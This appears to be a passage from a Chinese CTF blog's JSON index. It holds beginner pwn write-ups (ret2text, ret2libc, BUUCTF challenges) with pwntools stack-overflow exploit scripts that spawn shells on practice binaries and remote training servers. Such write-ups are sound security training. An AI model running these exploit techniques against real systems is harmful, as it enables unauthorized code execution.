r.recvuntil('e\\n') p.sendline('/bin/sh')#向fget函数发送字符串 a = r.recvuntil(':\\n')#等待接受到括号内的信息后再运行下面的内容 p.sendline(payload)#发送payload p.interactive() 好像不要a = r.recvuntil(‘e\\n’)，a = r.recvuntil(‘:\\n’)也可以……","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week2 T4","slug":"week2-T4","date":"2023-01-13T13:03:33.000Z","updated":"2024-01-31T02:34:07.946Z","comments":true,"path":"posts/31eee638/","link":"","permalink":"http://lmarch2.github.io/posts/31eee638/","excerpt":"T4 ret2libc2 2023-01-09WPctf-wiki 基础rop","text":"T4 ret2libc2 2023-01-09WPctf-wiki 基础rop 0x01file checksec——32-bit，开启NX 0x02拖入IDA看看危险函数和ret2libc1相同都是gets不同的是这次没有/bin/sh给我们用了我还找了好久来着……但是system函数还是有的那我们先找出system的地址0x08048490接下来我们得想办法弄出个/bin/sh来由于程序已经开启NX保护，我们无法直接写入栈所以思考在bss段写入字符串 说实话，这个地方第一次看真的怎么都想不到……然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……最后我直接在IDA里快捷键G了一下跳到了.bss段发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入/bin/sh到buff2去找gets的地址 得到0x8048460 0x03用gdb暴力求出偏移量终于可以写exp了 0x04from pwn import * sh = process('./ret2libc2') gets_plt = 0x08048460 system_plt = 0x08048490 buf2 = 0x804a080 payload = flat( [b'a' * 112, gets_plt, system_plt, buf2,buf2]) #先覆盖溢出，返回gets函数的地址， #接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2 sh.sendline(payload) sh.sendline('/bin/sh') sh.interactive() 这篇文章和这篇博客挺不错的还有这篇 0x05ctf-wiki的exp是 ##!/usr/bin/env python from pwn import * sh = process('./ret2libc2') gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]) sh.sendline(payload) sh.sendline('/bin/sh') sh.interactive() [‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？好像看到有博客说是为了堆栈平衡其实就是用了两个gadget在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T3","slug":"week2-T3","date":"2023-01-13T13:03:27.000Z","updated":"2024-01-31T02:34:01.184Z","comments":true,"path":"posts/af8a739b/","link":"","permalink":"http://lmarch2.github.io/posts/af8a739b/","excerpt":"T3 ret2libc1 2023-01-09WPctf-wiki 基础rop","text":"T3 ret2libc1 2023-01-09WPctf-wiki 基础rop 0x00 ctf-wiki中的原理解释ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。0x01file checksec——32-bit，开启NX 0x02IDA查看源码，应该是gets函数的栈溢出shift+f12看到有/bin/sh字符串,找地址为0x08048720并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460 0x03gdb调试找偏移量可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样 0x04我们要直接返回执行system 函数，exp可以这样写 from pwn import * sh = process('./ret2libc1') binsh_addr = 0x8048720 system_addr = 0x08048460 payload = flat([b'a' * 112, system_addr,b 'b' * 4, binsh_addr]) sh.sendline(payload) sh.interactive() 这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起 0x05 questions也可以直接返回system函数压参的地址0x0804860A(也就是 call _system处的地址)而不返回函数的 plt 处，但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数一个plt表和got表的教学文章","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T2","slug":"week2-T2","date":"2023-01-13T13:03:21.000Z","updated":"2024-01-31T02:33:54.877Z","comments":true,"path":"posts/d88d430d/","link":"","permalink":"http://lmarch2.github.io/posts/d88d430d/","excerpt":"T2 ret2text(上题的另一种解法) 2023-01-09WP网上看到另一种暴力解法感觉很不错于是自己做过了一遍0x01与0x02跟上题相同","text":"T2 ret2text(上题的另一种解法) 2023-01-09WP网上看到另一种暴力解法感觉很不错于是自己做过了一遍0x01与0x02跟上题相同 0x03大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可先用cyclic生成有序字符队列运行并输入生成的字符串得到invalid addres 0x62616164用cyclic -l查找偏移量 0x04写exp from pwn import * io = process('./ret2text') success_addr = 0x0804863A payload = b'a' * 112 + p32(success_addr) io.sendline(payload) io.interactive()","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week2 T1","slug":"week2-T1","date":"2023-01-13T13:03:09.000Z","updated":"2024-01-31T02:33:45.495Z","comments":true,"path":"posts/418412b7/","link":"","permalink":"http://lmarch2.github.io/posts/418412b7/","excerpt":"T1 ret2text 2023-01-09WPctf-wiki基础rop","text":"T1 ret2text 2023-01-09WPctf-wiki基础rop 0x01file checksec——32-bit， 开启NX 0x02IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞发现还有有一个secure函数调用了system(“/bin/sh”)双击字符串Ctrl+X，记下”/bin/sh”的地址0x0804863A0x0804863A就是需要返回的地址 0x03用gdb调试在调用gets函数的地址处0x080486AE设置断点r 运行如下其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4 0x04写exp from pwn import * sh = process('./ret2text') target = 0x804863a sh.sendline(b'A' * (0x6c+4) + p32(target)) sh.interactive() 0x05疑问：我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week1 T5","slug":"week1-T5","date":"2023-01-13T13:02:53.000Z","updated":"2024-01-31T02:33:35.742Z","comments":true,"path":"posts/545c7940/","link":"","permalink":"http://lmarch2.github.io/posts/545c7940/","excerpt":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwn第五题","text":"T5 pwn1_sctf_2016 2023-01-09WPBUUCTF pwn第五题 0x01file checksec——32-bit,开启NX 0x02IDA中shift+f12可以找到有个cat flag.txt可以利用这个函数来输出flag查看调用它的函数并记下它的地址0x8048F0D继续寻找能够溢出的函数，在main函数中的vuln函数里有fget()函数但是fget函数限制了输入长度为32，好像并不能构成栈溢出于是我就蒙了，fget后面的伪代码又不是看得很懂……查了许多大概理解了是后面的replace函数将一个字节的i换成了三个字节的you这样一来我们只需要输入20个‘I’，replace后就会变成60个字节的‘you’,这样就能填满长度为0x3Ch的spayload再覆盖掉ebp再加上get_flag函数的地址就可以了最后看大佬博客半懂半不懂地写了个exp（这篇博客感觉算是比较详细的，它甚至是直接分析汇编语言） 0x03exp from pwn import * p = remote('node4.buuoj.cn', 28105) flag_addre = 0x08048F0D payload = b'I'*0x14+b'aaaa'+p32(flag_addre) p.sendline(payload) p.interactive() 0x04还是不是很懂到底是怎么看出来是把i换成you的还有就是这个replace函数的参数列表中那个v4代表的是什么并没有在v4这里写入i或者you呀，这猜都不好猜是把i换成you了直接点进去看replace的源码好像又不科学，根本看不懂……补充：C++的伪代码就是比较难看，不能只看IDA了，要结合gdb调试去猜i换成you的替换","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T4","slug":"week1-T4","date":"2023-01-13T13:02:24.000Z","updated":"2024-01-31T02:33:29.735Z","comments":true,"path":"posts/235b49d6/","link":"","permalink":"http://lmarch2.github.io/posts/235b49d6/","excerpt":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwn第四题","text":"T4 ciscn_2019_n_1 2023-01-08WPBUUCTF pwn第四题 0x01先file，chekcsec——64-bit，开启NX 0x02IDA中main函数没啥有用的，看到还有一个fun函数点进去看发现有个gets函数，可能存在栈溢出，同时发现if ( v2 == 11.28125 )时调用system函数，所以想到输入来使v2的值等于11.28125但是gets读入的时v1而不是v2，所以又想到让v1溢出，使溢出的值为11.28125并让它成为v2的值于是进去查看v1v2的地址计算得长度为44h 0x03exp from pwn import * p=remote('node4.buuoj.cn',25907) payload=b\"a\"*44+p64(0x41348000)#0x41348000是11.28125的十六进制数 p.sendline(payload) p.interactive() 直接写11.28125好像没用……网上看到一篇博客是直接从IDA中找十六进制数的pwn得flag还有一种方法就是直接覆盖v1v2，让返回地址指向调用system函数的地址0x4006BE这就让我有一些疑惑：就这一题来说，开启了NX有没有让题目难度增加呢？","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T3","slug":"week1-T3","date":"2023-01-13T13:02:17.000Z","updated":"2024-01-31T02:33:22.595Z","comments":true,"path":"posts/bd3fdc75/","link":"","permalink":"http://lmarch2.github.io/posts/bd3fdc75/","excerpt":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似","text":"T3 warmup_csaw_2016 2023-01-06WPBUUCTF pwn第三题考点：栈溢出，与上题类似 0x01 checksec下载文件，没有开启任何保护（看大佬博客里说按经验这种情况一般就是栈溢出了） 0x02 IDAf5反汇编，main函数里有一个gets()函数看到返回一个gets()函数，可利用栈溢出但是这个两个参数的gets函数没有看懂……那个write和sprintf函数也没看懂……shift+f12调出string window 查看字符串，虽然没有/bin/sh，但是找到了一个cat flag.txt，应该可以利用双击cat flag.txt进去看看，X一下发现是在sub_40060D函数里，反汇编再看一下发现我们想要的system（）就在这，若能调用它的话就能直接命令抓取flag了呀接下来就是记下sub_40060D函数的地址0x40060D,并将其作为溢出的返回地址（也可以记把偏移量压入寄存器那条汇编指令处的地址0x40011）又因为要gets的v5的大小为0x40h，所以与返回地址的距离是0x40+8（rbp的长度） 0x03 exp写出exploit from pwn import * p = remote('node4.buuoj.cn',25916) payload='a'*(0x40+8)+p64(0x400611) p.sendline(payload) p.interactive() 得到flag 0x04 thinking这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址一开始没反应过来cat flag.txt可以直接用，还在那找/bin/sh,还是对信息不太敏感……不过对栈的相关知识的学习还是让人感觉有收获的","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T2","slug":"week1-T2","date":"2023-01-13T13:01:55.000Z","updated":"2024-01-31T02:33:15.626Z","comments":true,"path":"posts/ca38ece3/","link":"","permalink":"http://lmarch2.github.io/posts/ca38ece3/","excerpt":"T2 rip 2023-01-04WPBUUCTF pwn第二题考点：简单的栈溢出","text":"T2 rip 2023-01-04WPBUUCTF pwn第二题考点：简单的栈溢出 0x01 checksec查看保护机制啥都没开，非常nice 0x02 IDAfile后是64位，扔到IDA里打开string window,发现有/bin/sh，双击-》点击command,ctrl+X跳到fun函数里Function window直接找也行….直接f5大法main函数里好像没啥用看到char了一个s数组还有get函数，栈溢出无疑了fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行于是找出fun函数中调用system的地址0x40118A有了地址，现在需要知道的是s的长度，在IDA中可以找到距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address 0x03 expvim pwn1.py#pwn1.py from pwn import * p = remote(\"node4 .buuoj.cn\",25026) payload = b'a' * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() 一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……执行脚本得到flag 0x04 补充一些知识IDA栈帧视窗详细说明：这篇文章这篇文章举了一个例子详细说明","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week1 T1","slug":"week1-T1","date":"2023-01-13T12:15:14.000Z","updated":"2024-01-31T02:33:10.366Z","comments":true,"path":"posts/5331bd59/","link":"","permalink":"http://lmarch2.github.io/posts/5331bd59/","excerpt":"T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题","text":"T1 test_your_nc 2023-01-03WPBUUCTF pwn第一题 一、用checksec检测文件保护机制下载文件，checksec得知已开启NX保护（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位） 二、打开IDA将文件扔到IDA中，按下shift+f12,打开string window，发现/bin/sh双击/bin/sh，点击command，交叉引用快捷键X，发现地址在main函数里按下f5确定main函数就是一个简单地调用了/bin/sh的system函数(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……) 三、结合题目提示可知直接nc（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）ls列出文件目录发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得","categories":[{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]}],"categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"},{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"},{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"},{"name":"collections","slug":"collections","permalink":"http://lmarch2.github.io/categories/collections/"},{"name":"notes","slug":"notes","permalink":"http://lmarch2.github.io/categories/notes/"},{"name":"入门集训wp","slug":"入门集训wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"杯子","slug":"杯子","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"},{"name":"N1CTF","slug":"N1CTF","permalink":"http://lmarch2.github.io/tags/N1CTF/"},{"name":"DASCTF","slug":"DASCTF","permalink":"http://lmarch2.github.io/tags/DASCTF/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"},{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"},{"name":"C++","slug":"C","permalink":"http://lmarch2.github.io/tags/C/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"},{"name":"ctf，NepCTF","slug":"ctf，NepCTF","permalink":"http://lmarch2.github.io/tags/ctf%EF%BC%8CNepCTF/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"},{"name":"攻防世界","slug":"攻防世界","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.io/tags/hgame/"}]}